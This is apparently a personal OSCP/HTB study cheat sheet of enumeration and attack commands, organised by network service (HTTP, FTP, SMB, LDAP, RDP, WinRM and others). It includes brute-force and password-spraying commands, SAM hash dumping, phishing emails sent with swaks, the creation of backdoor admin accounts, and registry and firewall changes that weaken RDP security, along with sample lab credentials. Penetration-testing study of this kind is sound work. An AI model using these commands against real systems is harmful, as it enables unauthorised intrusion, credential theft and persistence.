# Enumeration

{% embed url="https://eins.li/posts/oscp-secret-sauce/" %}

{% embed url="https://liodeus.github.io/2020/09/18/OSCP-personal-cheatsheet.html" %}

{% embed url="https://github.com/oncybersec/oscp-enumeration-cheat-sheet" %}

#### IP Sweeping (Use for ports too)

```
for i in {1..255} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```

## Nmap

```
TCP
sudo nmap -v $ip -sC -sV -p- --open -oN tcpscan.nmap 
sudo nmap -sVC -vvv $ip --script vuln -oN fulltcpscan.nmap (Scan vulnerabilities eg. SMB)

UDP
sudo nmap -sU --top-ports 20 -oN udpscan.nmap -vv $ip
Always peform service scans too on individual ports if ther's no other play (Skylark)
sudo nmap -sUCV -p $port -vv $ip 

-Pn Disables host discovery and only conducts a port scan. 
-A OS/Version Detection
-O Remote OS detection using TCP/IP stack fingerprinting
```

* Random port with no info? try `nc IP PORT` or `echo "version" | nc IP PORT`
* Nmap may also get the service on a port wrong sometimes (eg. Aerospike was Nessus on port 3000 in OSCP-A

> I start nearly every box this way because it quickly returns a wealth of information. Sudo as it defaults to the faster half-open SYN scan, then -Pn to ignore ping and assume it is up, -n to ignore DNS, the IP address, -sC for default scripts, -sV for version information, -p- to scan all ports, and MOST importantly the — open argument to only apply scripts and version scans to found open ports.

## HTTP/HTTPS (80/443)

Look for

* Application/Web server versions - clone source for more hints if available
* All endpoints and those with user input (SQLi, SSTi, IDOR, File inclusion, Command injection)
* Different HTTP request methods
* HTTP headers (eg. JWT etc.)
* Source in dev tools

{% hint style="info" %}
Always look up documentation of service you're trying to exploit, 90% of the time the answer will be there if you feel all other vectors are off eg. where password may be stored, path to RCE etc.
{% endhint %}

### Ffuf

<pre><code>(VHost)     ffuf -w /usr/share/wordlists/bitquark-subdomains-top100000.txt -u http://$IP:PORT -H 'Host: FUZZ.board.htb' -f(c/s/w)   
(Directory) ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://$IP:PORT/FUZZ 
(File extension fuzzing) -e .php,.html,.txt            
(HTTP POST) ffuf -w [wordlist] -u [URL] -X POST -d '<a data-footnote-ref href="#user-content-fn-1">id=FUZZ</a>' -H 'header: value' -fs xxx  
(Use raw request) : ffuf -request request.txt -request-proto http -w wordlist.txt -r [FUZZ should be present in the request]
(Multiple params) ffuf -w list1.txt:W1 -w list2.txt:W2 -X POST -d "username=W1&#x26;password=W2" -u [URL] -fc 200

Extra flags
-p "1.0" and -rate [25]  to rate limit incase of WAF
-r follow redirect
-recursion
</code></pre>

### cURL

```
curl --insecure -u [username:password] -b "[cookiename]=[value]" -X POST --data "[data]" [URL] (--insecure bypass SSL verification)
```

#### WordPress

```
sudo wpscan --url http://[URL]
sudo wpscan --url http://[URL] -e ap --plugins-detection aggressive
```

Alt (wfuzz)

```
wfuzz -c -w /usr/share/wordlists/yes.txt -u "http://alert.htb/" -H "Host: FUZZ.alert.htb"
```

Real life pentests

```
nikto -h $ip
```

#### WebDAV

{% embed url="https://www.linkedin.com/pulse/exploiting-webdav-gainrce-arav-budhiraja/" %}
cadaver go crazy (ASP revshell)
{% endembed %}

{% embed url="https://github.com/omarexala/OSCP-Notes/tree/master/web-applications" %}
Common web apps you see like Jenkins etc.
{% endembed %}

## FTP (21)

* Version number and associated CVEs
* Anonymous / authenticated login (with discovered creds)
* Sensitive files that you have read access to
* File upload

```
Default path usually /var/ftp/
```

```
wget -r ftp://anonymous:@<IP>    [If you can't see anything or don't really know where you are]

ftp [ip]
passive (Mitigate entering passive mode)
dir
dir
binary (Set to binary mode for proper channel to download bin files)
get [file]
```

Brute Force

`sudo hydra -L names.txt -P '/usr/share/wordlists/seclists/Passwords/probable-v2-top1575.txt' -s 21 ftp://$IP`

## SSH (22)

```
ssh -L [kali_port]:localhost:[target_port] [user]@[ip] -fN
chmod 600 id_rsa
port forwarding (local and remote)
sshuttle
```

## SMTP (25) and Mail

**Always check** `/var/mail/` **and** `/var/spool/mail`

```
telnet 10.10.11.14 25
EHLO [emailid]
AUTH LOGIN
[username in base64]
[password in base64]
```

User Enumeration via SMTP \[no need for domain name here, eg. sales]

```
smtp-user-enum -M VRFY -U [userlist] -t [ip] 
```

Send Mail \[Phishing]

```
sudo swaks --to mailadmin@localhost --from jonas@localhost --header 'Subject: Please check this spreadsheet' --header-X-Test "Header" --server 192.168.171.140  --attach @yess.ods
```

Phishing links are sent in the body

`sudo swaks -t brian.moore@postfish.off --from it@postfish.off --server 192.168.214.137 --body "click http://192.168.214.137 to reset your password" --header "Subject: password reset"`

### IMAP (143)

{% hint style="info" %}
Hepet \[WIndows PG]
{% endhint %}

```
telnet $ip 143
A1 login jonas SicMundusCreatusEst
A1 list "INBOX/" "*"
g21 SELECT "INBOX"

F1 fetch 5 RFC822 [5 mails that's why]
```

Brute Forcing w hydra

`hydra -C user.txt imap://192.168.214.137`

{% embed url="https://4ykh4ncyb3r.github.io/posts/postfish/" %}
If user is part of two or more groups defo explore
{% endembed %}

```bash
SecLists/Usernames/Names/names.txt
```

### POP3 (110)

Brute force

```
hydra -l <USER> -P <PASSWORDS_LIST> -f <IP> pop3 -V
hydra -S -v -l <USER> -P <PASSWORDS_LIST> -s 995 -f <IP> pop3 -V
```

Read mail

```
telnet <IP> 110

USER <USER>
PASS <PASSWORD>
LIST
RETR <MAIL_NUMBER>
QUIT
```

## DNS (53)

```
dig axfr $fqdn @$ip [Zone transfer]
dig @<IP> any <domain_name>
```

## NFS (111/2049)

If you find NFS-related services, enumerate those.

```
nmap -p 111 --script nfs* $RHOST
```

If you find NFS shares, mount them and see if you can read/write files or change your permissions by adding a new user with a certain UID. If you can’t seem to do anything, _remember the fact that it is there for later_.

```
mount -t nfs -o vers=3 $RHOST:/SHARENAME /mnt

groupadd --gid 1337 pwn
useradd --uid 1337 -g pwn pwn
```

## SMB & RPC (139/445)

### NXC

```
nxc smb [ip]
# Use --local-auth for local accounts
# Use --continue-on-success to "spray"
nxc smb 10.10.11.35 -u userlist.txt -p 'password' [bruteforce usernames, change smb to winrm/ldap or any other protocol you want to test perms for]
nxc smb $ip -u guest -p '' --shares [list shares depending on user access provided]
nxc winrm ./targets.txt -d medtech.com -u wario -p 'Mushroom!' [domain users, --local-auth otherwise]] 
nxc smb 192.168.209.159 -u guest -p '' -M spider_plus -o DOWNLOAD_FLAG=True [Download all files available]
```

**Other NXC perks**

**Spray across all protocols**

```
for p in {ftp,mssql,rdp,wmi,ldap,smb,winrm}; do nxc $p ips.txt -u users.txt -H hashes.txt [--no-bruteforce] ; done 2>/dev/null
```

**You can execute commands/extract hashes like mimikatz with NXC don't forget in case something goes wrong**

```
nxc smb [host] -u [user] -p [password] --sam
nxc smb 10.10.10.10 -u Username -p Password -X 'powershell -e [shell]'
```

**ADCS**

```
nxc ldap 10.10.11.202 -u ryan.cooper -p NuclearMosquito3 -M adcs
```

### SMBClient

```
smbclient //[ip]/[share] -N -L [List share with null auth]
smbclient -L //[ip] -U [user]
smbclient --user username //10.10.11.35/DEV
smbclient -U 'laser.com\\Eric.Wallows' //MS01.feast.com/Apps
recurse ON
prompt OFF
mget *
smbclient.py '[domain]/[user]:[pass]@[ip/host] -k -no-pass [Kerberos auth]
```

#### SMBmap

```
smbmap -H [ip] -u user -p 'password' -r SYSVOL --depth 10
smbmap -H [ip] --download PATH_TO_FILE
```

### RPCClient

```
rpcclient -U '' [-N/--pw-nt-hash (val)] 10.10.11.35   
rpcclient -U 'user'  10.10.11.35
enumdomusers
enumdomgroups
querydispinfo (less info about all users)
querygroup [RID]
queryuser [RID]
enumprivs
```

#### User Enumeration

<pre><code><strong>lookupsid.py guest@[ip] -no-pass
</strong>lookupsid.py [domain]/[user]:'[pass]'@[ip/domain]
netexec smb [ip] -u guest -p '' --[rid-brute/users/groups/local-users]
</code></pre>

#### Mount Shares

```
#First create folder in kali linux 
mkdir /mnt/smb
#mount folder to kali
sudo mount -t cifs //[IP]/[SHARE] /mnt/smb
```

{% embed url="https://0xdf.gitlab.io/2024/03/21/smb-cheat-sheet.html" %}

{% embed url="https://www.hackingarticles.in/active-directory-enumeration-rpcclient/" %}

## SNMP (161)

<pre><code>snmpwalk -v2c -c public 192.168.244.156 -m all
<strong>snmpwalk -v 2c -c public 192.168.xxx.156 NET-SNMP-EXTEND-MIB::nsExtendOutputFull
</strong>snmpwalk -v 1 -c public 192.168.100.200 NET-SNMP-EXTEND-MIB::nsExtendObjects

snmpbulkwalk -c &#x3C;COMMUNITY_STRING> -v&#x3C;VERSION> &#x3C;IP>

Brute-force community strings
onesixtyone -c /home/liodeus/wordlist/SecLists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt &#x3C;IP>

snmp-check &#x3C;IP>

nmap --script "snmp* and not snmp-brute" &#x3C;target>
</code></pre>

```
Please check diff versions (1, 2c etc.) after trying to brute-force community string
snmpbulkwalk -c public -v2c 192.168.232.149 .
```

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

## LDAP (389)&#x20;

Good place to find user creds - check user description along with rpcclient

```
ldapsearch -H ldap://[ip] -x -s base namingcontexts  [-x simple auth, -s scope]
ldapsearch -H ldap://[ip] -x -b "DC=htb,DC=local" > ldap.anon.out  
ldapsearch -H ldap://[ip] -x -b "DC=htb,DC=local" '(objectClass=Person)'

Windows timestamp to human cus Windows does not follow EPOC, for user and password creation and last pass attempt and all the stuff associated with the above search
ldapsearch -H ldap://[ip] -x -b "DC=htb,DC=local" '(objectClass=Person)' sAMAccountName  
ldapsearch -H ldap://[ip] -x -b "DC=htb,DC=local" '(objectClass=Person)' sAMAccountName  sAMAccountType

ldapsearch -H ldap://[ip] -x -b "DC=htb,DC=local" '(objectClass=Person)' sAMAccountName sAMAccountType | grep sAMAccountName | awk '{print $2}' > userlist.ldap

ldapsearch -H ldap://support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" | grep "User" -B 20 -A 20
ldapsearch -H ldap://support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" '(&(objectClass=Person)(cn=support))'| grep "User" -A 20 -B 20

nxc ldap 10.10.10.10 -u '' -p '' -M get-desc-users
nxc ldap 10.10.10.10 -u '' -p '' --password-not-required --admin-count --users --groups
```

{% embed url="https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap" %}

{% embed url="https://web.archive.org/web/20200309204648/http://0daysecurity.com/penetration-testing/enumeration.html" %}

## RDP (3389)

Case sensitivity when adding domain and computer names in hosts file and command itself if needed

```
In RDP commands
NetBIOS_Domain_Name the way to go for domain accounts
NetBIOS_Computer_Name for local accounts
Follow the same all uppercase

When adding to hosts, follow the DNS_Domain_Name and DNS_Computer_Name (mostly all lowercase)

rdesktop $IP [If this doesn't show up a login screen, NLA is enforced]

WORKED
xfreerdp /d:MEDTECH /u:yoshi /p:'Mushroom!' /v:DEV04.medtech.com /dynamic-resolution /cert:ignore [/sec:nla]
Try using xfreerdp [above_stuff] /w:2600 /h:1400 to see if the certificate warning disappears.

FOR STANDALONE
xfreerdp /u:user /p:'password' /v:192.168.220.145 /dynamic-resolution /cert:ignore

TO VERIFY
rdp_check.py user:password@IP   
```

> I just dealt with Nla and credssp errors in lab. Banging my head against the wall and then accidently left off the -d domain name and it worked. It logged in as domain user and I'm not sure how but that was xfreerdp. I didn't try the fix with rdesktop. I just moved on

{% code title="Add user for RDP access (3389 should be open ofc)" %}
```powershell
#To create a user named api with a password of Dork123!
net user api Dork123! /add
#To add to the administrator and RDP groups
net localgroup Administrators api /add
net localgroup "Remote Management Users" [username] /add
net localgroup 'Remote Desktop Users' api /add

xfreerdp /cert:ignore /dynamic-resolution +clipboard /u:'api' /p:'Dork123!' /v:NICKEL

For Domain User
net user [username] [password] /add /domain
net group "Domain Admins" [username] /add /domain
```
{% endcode %}

#### Enable RDP on System

{% embed url="https://duckwrites.medium.com/enabling-rdp-the-easy-way-with-nxc-d07bc247f45c" %}

```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
	OR
netsh advfirewall set allprofiles state off

sc start TermService
```

## WinRM (5985)

{% hint style="info" %}
Timelapse \[HTB AD]
{% endhint %}

Logging via certificates and SSL (-S)

```
evil-winrm -i $ip -u 'domain\user' -p 'password' 
evil-winrm -i timelapse.htb -S -c certificate.crt -k yourkey_dec.pem
```

## Redis (6379)

{% hint style="info" %}
Blackgate and Readys \[PG Linux]
{% endhint %}

{% embed url="https://book.hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html" %}

[^1]: FUZZ=key if you wanna do the opposite
